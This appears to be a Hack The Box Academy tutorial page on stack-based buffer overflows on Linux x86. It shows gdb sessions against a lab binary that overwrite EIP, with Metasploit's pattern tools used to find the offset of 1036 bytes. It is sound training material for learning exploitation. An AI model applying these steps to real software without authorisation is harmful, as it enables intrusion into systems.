<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/31/section/390
// Platform Version: V1
// Module ID: 31
// Module Name: Stack-Based Buffer Overflows on Linux x86
// Module Difficulty: Medium
// Section ID: 390
// Section Title: Take Control of EIP
// Page Title: Stack-Based Buffer Overflows on Linux x86
// Page Number: 06
-->

# Take Control of EIP

**Module Name:** Stack-Based Buffer Overflows on Linux x86 **Page Number:** 06

#### STACK-BASED BUFFER OVERFLOWS ON LINUX X86

# Take Control of EIP

#### Segmentation Fault

``` shell-session
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

``` shell-session
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

#### Buffer

![https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_2.png)

## Determine The Offset

#### Create Pattern

``` shell-session
[!bash!]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
[!bash!]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```

#### GDB - Using Generated Pattern

``` shell-session
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

#### GDB - EIP

``` shell-session
(gdb) info registers eip

eip            0x69423569	0x69423569
```

#### GDB - Offset

``` shell-session
[!bash!]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```

#### Buffer

![https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_3.png)

#### GDB Offset

``` shell-session
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)

# 

# 

#### Questions

####